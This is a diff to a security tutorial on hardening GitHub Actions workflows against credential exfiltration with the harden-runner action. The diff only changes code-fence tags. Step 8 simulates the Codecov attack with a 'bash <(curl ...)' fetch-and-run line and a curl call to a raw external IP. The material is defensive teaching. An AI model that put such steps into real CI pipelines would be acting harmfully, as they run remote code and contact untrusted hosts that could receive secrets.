@@ -29,13 +29,13 @@ Learn how to prevent exfiltration of credentials from a GitHub Actions workflow.
 
 3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the `ci.yml` file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step. Commit the changes either to `main` branch or any other branch.  
 
-    ```
+    ```yaml
     - uses: step-security/harden-runner@v1
       with:
         egress-policy: audit
     ```
     The updated file should look like this:
-    ```
+    ```yaml
     name: Test and coverage
 
     on: [push, pull_request, workflow_dispatch]
@@ -72,7 +72,7 @@ Learn how to prevent exfiltration of credentials from a GitHub Actions workflow.
 
 7. Update the `ci.yml` workflow with the policy. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 
 
-    ```
+    ```yaml
     - uses: step-security/harden-runner@v1
       with:
         allowed-endpoints: 
@@ -80,7 +80,7 @@ Learn how to prevent exfiltration of credentials from a GitHub Actions workflow.
           github.com:443
     ```
     The updated file should look like this:
-    ```
+    ```yaml
     name: Test and coverage
 
     on: [push, pull_request, workflow_dispatch]
@@ -110,14 +110,14 @@ Learn how to prevent exfiltration of credentials from a GitHub Actions workflow.
 
 8. Simulate an exfiltration attack similar to Codecov. Update the workflow and add the following statement. The bash uploader is no longer vulnerable, but when it was, it would have made an additional outbound call, which is being simulated here. 
 
-    ```
+    ```yaml
     - name: Upload coverage to Codecov
       run: |
         bash <(curl -s https://codecov.io/bash)
         curl -X GET http://104.248.94.23   
     ```
     The updated file should look like this:
-    ```
+    ```yaml
     name: Test and coverage
 
     on: [push, pull_request, workflow_dispatch]
